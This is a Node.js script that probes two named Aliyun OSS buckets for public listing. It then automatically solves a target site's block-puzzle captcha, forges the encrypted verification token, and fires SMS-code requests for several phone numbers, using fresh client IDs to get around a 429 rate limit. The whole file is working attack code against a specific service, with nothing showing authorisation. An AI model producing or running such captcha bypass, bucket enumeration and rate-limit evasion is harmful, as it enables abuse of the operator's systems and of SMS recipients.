const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/140.0.0.0 Safari/537.36';
const probe=async(u)=>{try{const r=await fetch(u,{headers:{'User-Agent':UA},redirect:'manual',signal:AbortSignal.timeout(12000)});const b=Buffer.from(await r.arrayBuffer());return r.status+' len='+b.length+' | '+b.toString('utf8').replace(/\s+/g,' ').slice(0,220);}catch(e){return 'ERR '+e.name;}};
console.log('=== OSS 桶列举测试 ===');
for(const b of ['zy-dimnx','zy-dimnx-test']){
  console.log(' '+b+' ?list-type=2', await probe('https://'+b+'.oss-cn-shenzhen.aliyuncs.com/?list-type=2&max-keys=3'));
  console.log(' '+b+' ?prefix=2026/11/', await probe('https://'+b+'.oss-cn-shenzhen.aliyuncs.com/?prefix=2026/11/&max-keys=3'));
  console.log(' '+b+' 空路径', await probe('https://'+b+'.oss-cn-shenzhen.aliyuncs.com/'));
}
console.log('\n=== 429 重测（新号 + 不同 scene）===');
const {B,H,j,aes,solveV2}=await import('./lib_captcha.mjs');
const crypto=await import('node:crypto');
async function ticket(){
  const uid=crypto.randomUUID();
  const cap=await j(fetch(B+'/api/auth/captcha/behavior?'+new URLSearchParams({captchaType:'blockPuzzle',clientUid:uid,ts:String(Date.now())}),{headers:H}));
  const d=cap.data;
  const r=solveV2(Buffer.from(d.originalImageBase64,'base64'),Buffer.from(d.jigsawImageBase64,'base64'));
  const best=r.nccTop[0];
  const pointJson=aes(JSON.stringify({x:best.dx,y:5}),d.secretKey);
  const chk=await j(fetch(B+'/api/auth/captcha/behavior',{method:'POST',headers:H,body:JSON.stringify({captchaType:'blockPuzzle',token:d.token,pointJson,clientUid:uid,ts:Date.now()})}));
  if(chk?.data?.repCode!=='0000')return null;
  return {token:d.token,clientUid:uid,ts:Date.now(),captchaVerification:aes(d.token+'---'+pointJson,d.secretKey)};
}
for(const [ph,sc] of [['19900000041','login'],['19900000042','register']]){
  const c=await ticket();
  if(!c){console.log(ph,'ticket fail');continue;}
  const r=await j(fetch(B+'/api/auth/sms/send',{method:'POST',headers:H,body:JSON.stringify({phone:ph,scene:sc,captchaType:'blockPuzzle',token:c.token,clientUid:c.clientUid,ts:c.ts,captchaVerification:c.captchaVerification})}));
  console.log(ph,sc,'->',JSON.stringify(r));
}
